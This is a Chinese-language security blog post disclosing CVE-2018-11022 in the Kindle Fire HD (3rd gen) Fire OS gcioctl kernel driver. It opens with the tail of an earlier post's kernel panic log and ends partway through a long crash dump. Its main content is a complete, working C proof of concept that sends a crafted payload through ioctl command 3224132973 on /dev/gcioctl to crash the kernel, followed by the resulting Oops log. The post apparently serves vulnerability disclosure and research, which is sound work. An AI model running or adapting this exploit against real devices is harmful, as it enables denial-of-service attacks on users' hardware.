006f0063 002e006d</span><br><span class="line">[   96.867340] Backtrace: </span><br><span class="line">[   96.870330] [&lt;c06a4d50&gt;] (__raw_spin_lock_irqsave+0x0&#x2F;0xb0) from [&lt;c06a4e10&gt;] (_raw_spin_lock_irqsave+0x10&#x2F;0x14)</span><br><span class="line">[   96.881591]  r6:d02be000 r5:1a03e6f3 r4:00000082 r3:0000020a</span><br><span class="line">[   96.888488] [&lt;c06a4e00&gt;] (_raw_spin_lock_irqsave+0x0&#x2F;0x14) from [&lt;c06a4e24&gt;] (_raw_spin_lock_irq+0x10&#x2F;0x14)</span><br><span class="line">[   96.899291] [&lt;c06a4e14&gt;] (_raw_spin_lock_irq+0x0&#x2F;0x14) from [&lt;c06a3008&gt;] (wait_for_common+0x28&#x2F;0x150)</span><br><span class="line">[   96.909729] [&lt;c06a2fe0&gt;] (wait_for_common+0x0&#x2F;0x150) from [&lt;c06a319c&gt;] (wait_for_completion_interruptible_timeout+0x14&#x2F;0x18)</span><br><span class="line">[   96.922149] [&lt;c06a3188&gt;] (wait_for_completion_interruptible_timeout+0x0&#x2F;0x18) from [&lt;c0317c28&gt;] (dev_ioctl+0x7ec&#x2F;0x10c4)</span><br><span class="line">[   96.934204] [&lt;c031743c&gt;] (dev_ioctl+0x0&#x2F;0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[   96.943481] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[   96.952636] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[   96.961822]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e54 r4:bed24638</span><br><span class="line">[   96.970153] Code: e5843004 e10f0000 f10c0080 e1953f9f (e3330000) </span><br><span class="line">[   96.977264] Board Information: </span><br><span class="line">[   96.977264]  Revision : 0001</span><br><span class="line">[   96.977294]  Serial	: 0000000000000000</span><br><span class="line">[   96.977294] SoC Information:</span><br><span class="line">[   96.977294]  CPU	: OMAP4470</span><br><span class="line">[   96.977294]  Rev	: ES1.0</span><br><span class="line">[   96.977325]  Type	: HS</span><br><span class="line">[   96.977325]  Production ID: 0002B975-000000CC</span><br><span class="line">[   96.977325]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[   96.977355] </span><br><span class="line">[   97.013824] ---[ end trace 2432291f2b5d99ba ]---</span><br><span class="line">[   97.019195] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[   97.025024] CPU1: stopping</span><br><span class="line">[   97.028137] Backtrace: </span><br><span class="line">[   97.031311] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[   97.040679]  r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950</span><br><span class="line">[   97.047668] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[   97.056884] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[   97.066253] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40&#x2F;0x70)</span><br><span class="line">[   97.075561] Exception stack(0xd6cb7d28 to 0xd6cb7d70)</span><br><span class="line">[   97.081237] 7d20:                   c1620b40 c3152ac0 d799dc70 00000000 00000000 c1620b40</span><br><span class="line">[   97.090454] 7d40: d6cb6000 c4eaaf80 00000001 c4eaaf80 c1620b40 d6cb7d7c d6cb7d80 d6cb7d70</span><br><span class="line">[   97.099670] 7d60: c0074004 c06a4880 60070013 ffffffff</span><br><span class="line">[   97.105346]  r6:ffffffff r5:60070013 r4:c06a4880 r3:c0074004</span><br><span class="line">[   97.112487] [&lt;c06a485c&gt;] (_raw_spin_unlock_irq+0x0&#x2F;0x50) from [&lt;c0074004&gt;] (finish_task_switch+0x58&#x2F;0x12c)</span><br><span class="line">[   97.123321] [&lt;c0073fac&gt;] (finish_task_switch+0x0&#x2F;0x12c) from [&lt;c06a36fc&gt;] (__schedule+0x3ec&#x2F;0x830)</span><br><span class="line">[   97.133239]  r8:c3152ac0 r7:c09ddc50 r6:d6cb6000 r5:c09b6b40 r4:c4fcf340</span><br><span class="line">[   97.141143] r3:00000001</span><br><span class="line">[   97.144500] [&lt;c06a3310&gt;] (__schedule+0x0&#x2F;0x830) from [&lt;c06a3c24&gt;] (preempt_schedule+0x40&#x2F;0x5c)</span><br><span class="line">[   97.154174] [&lt;c06a3be4&gt;] (preempt_schedule+0x0&#x2F;0x5c) from [&lt;c06a4808&gt;] (_raw_spin_unlock+0x48&#x2F;0x4c)</span><br><span class="line">[   97.164337]  r4:c0a7375c r3:00000002</span><br><span class="line">[   97.168731] [&lt;c06a47c0&gt;] (_raw_spin_unlock+0x0&#x2F;0x4c) from [&lt;c00983d0&gt;] (futex_wake+0xfc&#x2F;0x130)</span><br><span class="line">[   97.178436] [&lt;c00982d4&gt;] (futex_wake+0x0&#x2F;0x130) from [&lt;c0099868&gt;] (do_futex+0xf8&#x2F;0x9e8)</span><br><span class="line">[   97.187469] [&lt;c0099770&gt;] (do_futex+0x0&#x2F;0x9e8) from [&lt;c009a1ec&gt;] (sys_futex+0x94&#x2F;0x178)</span><br><span class="line">[   97.196289] [&lt;c009a158&gt;] (sys_futex+0x0&#x2F;0x178) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[   97.205871] CPU0 PC (0) : 0xc003ee38</span><br><span class="line">[   97.209930] CPU0 PC (1) : 0xc003ee54</span><br><span class="line">[   97.214111] CPU0 PC (2) : 0xc003ee54</span><br><span class="line">[   97.218170] CPU0 PC (3) : 0xc003ee54</span><br><span class="line">[   97.222229] CPU0 PC (4) : 0xc003ee54</span><br><span class="line">[   97.226409] CPU0 PC (5) : 0xc003ee54</span><br><span class="line">[   97.230468] CPU0 PC (6) : 0xc003ee54</span><br><span class="line">[   97.234527] CPU0 PC (7) : 0xc003ee54</span><br><span class="line">[   97.238739] CPU0 PC (8) : 0xc003ee54</span><br><span class="line">[   97.242767] CPU0 PC (9) : 0xc003ee54</span><br><span class="line">[   97.246826] CPU1 PC (0) : 0xc0019b2c</span><br><span class="line">[   97.251007] CPU1 PC (1) : 0xc0019b2c</span><br><span class="line">[   97.255065] CPU1 PC (2) : 0xc0019b2c</span><br><span class="line">[   97.259124] CPU1 PC (3) : 0xc0019b2c</span><br><span class="line">[   97.263183] CPU1 PC (4) : 0xc0019b2c</span><br><span class="line">[   97.267364] CPU1 PC (5) : 0xc0019b2c</span><br><span class="line">[   97.271423] CPU1 PC (6) : 0xc0019b2c</span><br><span class="line">[   97.275482] CPU1 PC (7) : 0xc0019b2c</span><br><span class="line">[   97.279693] CPU1 PC (8) : 0xc0019b2c</span><br><span class="line">[   97.283752] CPU1 PC (9) : 0xc0019b2c</span><br><span class="line">[   97.287811] </span><br><span class="line">[   97.289581] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[   97.289611] </span><br></pre></td></tr></table></figure>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2020-09-12T15:12:41.000Z" title="2020-09-12T15:12:41.000Z">2020-09-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-09-12T15:18:58.871Z" title="2020-09-12T15:18:58.871Z">2020-09-12</time></span><span class="level-item"><a class="link-muted" href="/categories/IOT/">IOT</a></span><span class="level-item">13 minutes read (About 1976 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11022%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">（CVE-2018-11022）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</a></h1><div class="content"><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>mazon Kindle Fire HD（3rd）Fire OS 4.5.5.3的内核组件中的内核模块/omap/drivers/misc/gcx/gcioctl/gcif.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ gcioctl使用命令<strong>3224132973，</strong>并导致内核崩溃。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/gcioctl causes the system crash via IOCTL 3224132973.</span></span><br><span class="line"><span class="comment"> * Related buggy struct name is gcicommit.</span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/gcioctl.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The fowllwing is kmsg of kernel crash infomation:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/gcioctl&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">3224132973</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> payload[] = &#123;</span><br><span class="line">    <span class="number">0x00002020</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0xeddad33f</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0xf16c7d8e</span>,</span><br><span class="line">    <span class="number">0x96489dd1</span>,</span><br><span class="line">    <span class="number">0x678a12ff</span>,</span><br><span class="line">    <span class="number">0x69812204</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        fd = open(driver, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try open %s with command 0x%x.\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line">[  381.205780] Unable to handle kernel NULL pointer dereference at virtual address 00000004</span><br><span class="line">[  381.215637] pgd &#x3D; c30e4000</span><br><span class="line">[  381.219085] [00000004] *pgd&#x3D;97437831, *pte&#x3D;00000000, *ppte&#x3D;00000000</span><br><span class="line">[  381.227355] Internal error: Oops: 817 [#1] PREEMPT SMP ARM</span><br><span class="line">[  381.233520] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[  381.241302] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[  381.248596] PC is at free_buffer+0x4c&#x2F;0x13c</span><br><span class="line">[  381.253479] LR is at down_timeout+0x40&#x2F;0x5c</span><br><span class="line">[  381.258209] pc : [&lt;c031716c&gt;]    lr : [&lt;c006e9b8&gt;]    psr: a0000013</span><br><span class="line">[  381.258209] sp : de943e58  ip : de943e38  fp : de943e6c</span><br><span class="line">[  381.271179] r10: 00000000  r9 : dd3e8ca8  r8 : c25e6598</span><br><span class="line">[  381.277160] r7 : eddad327  r6 : de942000  r5 : c0a25b50  r4 : c25e6580</span><br><span class="line">[  381.284454] r3 : 00000000  r2 : c0a25b64  r1 : c0a25b64  r0 : 00000000</span><br><span class="line">[  381.291870] Flags: NzCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[  381.299804] Control: 10c5387d  Table: 830e404a  DAC: 00000015</span><br><span class="line">[  381.306335] </span><br><span class="line">[  381.306365] PC: 0xc03170ec:</span><br><span class="line">[  381.311340] 70ec  e1a00001 e34c2091 e3a01a01 e30531e8 e34c306e ebfd3650 e89da800 e1a0c00d</span><br><span class="line">[  381.321868] 710c  e92dd800 e24cb004 ebffced4 e3a00000 e89da800 e1a0c00d e92dd830 e24cb004</span><br><span class="line">[  381.332550] 712c  e1a04000 e3020710 e59f510c ebf4dd18 e1a01000 e1a00005 ebf55e0b e3500000</span><br><span class="line">[  381.343078] 714c  1a000023 e5943000 e1540003 0a000008 e1a02005 e5940004 e5b21014 e5853014</span><br><span class="line">[  381.353759] 716c  e5832004 e5801000 e5810004 e5844000 e5844004 e59f00c0 ebf55d9f e3020710</span><br><span class="line">[  381.364440] 718c  e59f50b4 ebf4dd02 e1a01000 e285001c ebf55df5 e3500000 1a00001a e594201c</span><br><span class="line">[  381.375122] 71ac  e1a03005 e594c018 e2841018 e285001c e58c2004 e582c000 e5b32030 e5851030</span><br><span class="line">[  381.385681] 71cc  e5821004 e5842018 e584301c ebf55d8a e89da830 e1a03000 e3a02068 e59f105c</span><br><span class="line">[  381.396331] </span><br><span class="line">[  381.396362] LR: 0xc006e938:</span><br><span class="line">[  381.401306] e938  e1a01000 0a000007 e3a05000 e2433001 e5843008 e1a00004 eb18d7ad e1a00005</span><br><span class="line">[  381.411987] e958  e24bd014 e89da830 e1a00004 e50b1018 eb18d135 e51b1018 e1a05000 eafffff4</span><br><span class="line">[  381.422668] e978  e1a0c00d e92dd878 e24cb004 e1a04000 e1a05001 eb18d91b e5943008 e3530000</span><br><span class="line">[  381.433288] e998  e1a06000 0a000007 e3a05000 e2433001 e5843008 e1a00004 e1a01006 eb18d794</span><br><span class="line">[  381.443817] e9b8  e1a00005 e89da878 e1a01005 e1a00004 eb18d158 e1a05000 eafffff5 e1a0c00d</span><br><span class="line">[  381.454498] e9d8  e92dd800 e24cb004 e5903000 e1a0c000 e3530000 0a00000b e5910008 e5932008</span><br><span class="line">[  381.465179] e9f8  e1500002 da000003 ea000006 e5932008 e1520000 ba000003 e283c004 e5933004</span><br><span class="line">[  381.475830] ea18  e3530000 1afffff8 e5813004 f57ff05f e3a00000 e58c1000 e89da800 e1a0c00d</span><br><span class="line">[  381.486358] </span><br><span class="line">[  381.486358] SP: 0xde943dd8:</span><br><span class="line">[  381.491455] 3dd8  de942000 00000001 00000004 dd2160f4 60010013 c031716c a0000013 ffffffff</span><br><span class="line">[  381.501983] 3df8  de943e44 c25e6598 de943e6c de943e10 c06a5318 c0008370 00000000 c0a25b64</span><br><span class="line">[  381.512664] 3e18  c0a25b64 00000000 c25e6580 c0a25b50 de942000 eddad327 c25e6598 dd3e8ca8</span><br><span class="line">[  381.523315] 3e38  00000000 de943e6c de943e38 de943e58 c006e9b8 c031716c a0000013 ffffffff</span><br><span class="line">[  381.533996] 3e58  00000000 be8075c8 de943f04 de943e70 c0317704 c031712c 00000001 00000028</span><br><span class="line">[  381.544525] 3e78  be8075c8 de943ea0 de943e98 de943e90 c0207454 c00bd920 de943e90 de943e90</span><br><span class="line">[  381.555206] 3e98  de943e98 de943e98 00000000 00000002 00000002 eddad33f 41414141 41414141</span><br><span class="line">[  381.565734] 3eb8  41414141 41414141 41414141 41414141 41414141 d7b96700 de943efc de943ee0</span><br><span class="line">[  381.576293] </span><br><span class="line">[  381.576293] IP: 0xde943db8:</span><br><span class="line">[  381.581390] 3db8  de943dd4 de943dc8 c00795b4 c00792bc de943e0c de943dd8 c0070df8 c00795ac</span><br><span class="line">[  381.592071] 3dd8  de942000 00000001 00000004 dd2160f4 60010013 c031716c a0000013 ffffffff</span><br><span class="line">[  381.602630] 3df8  de943e44 c25e6598 de943e6c de943e10 c06a5318 c0008370 00000000 c0a25b64</span><br><span class="line">[  381.613311] 3e18  c0a25b64 00000000 c25e6580 c0a25b50 de942000 eddad327 c25e6598 dd3e8ca8</span><br><span class="line">[  381.623870] 3e38  00000000 de943e6c de943e38 de943e58 c006e9b8 c031716c a0000013 ffffffff</span><br><span class="line">[  381.634399] 3e58  00000000 be8075c8 de943f04 de943e70 c0317704 c031712c 00000001 00000028</span><br><span class="line">[  381.645080] 3e78  be8075c8 de943ea0 de943e98 de943e90 c0207454 c00bd920 de943e90 de943e90</span><br><span class="line">[  381.655761] 3e98  de943e98 de943e98 00000000 00000002 00000002 eddad33f 41414141 41414141</span><br><span class="line">[  381.666442] </span><br><span class="line">[  381.666442] FP: 0xde943dec:</span><br><span class="line">[  381.671417] 3dec  c031716c a0000013 ffffffff de943e44 c25e6598 de943e6c de943e10 c06a5318</span><br><span class="line">[  381.681976] 3e0c  c0008370 00000000 c0a25b64 c0a25b64 00000000 c25e6580 c0a25b50 de942000</span><br><span class="line">[  381.692535] 3e2c  eddad327 c25e6598 dd3e8ca8 00000000 de943e6c de943e38 de943e58 c006e9b8</span><br><span class="line">[  381.703216] 3e4c  c031716c a0000013 ffffffff 00000000 be8075c8 de943f04 de943e70 c0317704</span><br><span class="line">[  381.713867] 3e6c  c031712c 00000001 00000028 be8075c8 de943ea0 de943e98 de943e90 c0207454</span><br><span class="line">[  381.724548] 3e8c  c00bd920 de943e90 de943e90 de943e98 de943e98 00000000 00000002 00000002</span><br><span class="line">[  381.735076] 3eac  eddad33f 41414141 41414141 41414141 41414141 41414141 41414141 41414141</span><br><span class="line">[  381.745758] 3ecc  d7b96700 de943efc de943ee0 c02089fc 00000000 d74f9540 00000004 d74f9540</span><br><span class="line">[  381.756408] </span><br><span class="line">[  381.756408] R1: 0xc0a25ae4:</span><br><span class="line">[  381.761383] 5ae4  00000000 00000000 00040b03 01040101 ffff0100 00000000 00000000 0000ffff</span><br><span class="line">[  381.772064] 5b04  00000000 0e0c0000 01010005 01000105 0000ffff 00000000 0e0c0000 01010005</span><br><span class="line">[  381.782714] 5b24  00000105 01040901 00040001 ffff0101 00000000 00000000 00040b03 01040101</span><br><span class="line">[  381.793273] 5b44  3f3f0100 00010001 01000001 00000000 00000000 00000000 c0a25b5c c0a25b5c</span><br><span class="line">[  381.803955] 5b64  00000000 c0a25b64 00000000 00000000 00000001 c0a25b78 c0a25b78 c0a25b80</span><br><span class="line">[  381.814605] 5b84  c0a25b80 00000000 00000000 00000001 c0a25b94 c0a25b94 c0a25b9c c0a25b9c</span><br><span class="line">[  381.825286] 5ba4  00000000 00000000 00000001 c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0</span><br><span class="line">[  381.835815] 5bc4  c0a25bc0 c0a25bc8 c0a25bc8 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  381.846496] </span><br><span class="line">[  381.846496] R2: 0xc0a25ae4:</span><br><span class="line">[  381.851470] 5ae4  00000000 00000000 00040b03 01040101 ffff0100 00000000 00000000 0000ffff</span><br><span class="line">[  381.862152] 5b04  00000000 0e0c0000 01010005 01000105 0000ffff 00000000 0e0c0000 01010005</span><br><span class="line">[  381.872802] 5b24  00000105 01040901 00040001 ffff0101 00000000 00000000 00040b03 01040101</span><br><span class="line">[  381.883453] 5b44  3f3f0100 00010001 01000001 00000000 00000000 00000000 c0a25b5c c0a25b5c</span><br><span class="line">[  381.893981] 5b64  00000000 c0a25b64 00000000 00000000 00000001 c0a25b78 c0a25b78 c0a25b80</span><br><span class="line">[  381.904663] 5b84  c0a25b80 00000000 00000000 00000001 c0a25b94 c0a25b94 c0a25b9c c0a25b9c</span><br><span class="line">[  381.915344] 5ba4  00000000 00000000 00000001 c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0</span><br><span class="line">[  381.925872] 5bc4  c0a25bc0 c0a25bc8 c0a25bc8 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  381.936523] </span><br><span class="line">[  381.936523] R4: 0xc25e6500:</span><br><span class="line">[  381.941619] 6500  00000002 00000000 d7a55550 00000000 00000000 00000000 c2410c00 000008a8</span><br><span class="line">[  381.952148] 6520  c0a10a88 00000000 c16281fc 00000000 00000000 00000000 00000000 000003e8</span><br><span class="line">[  381.962829] 6540  c25e6000 00000093 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  381.973480] 6560  00000000 00000000 00000000 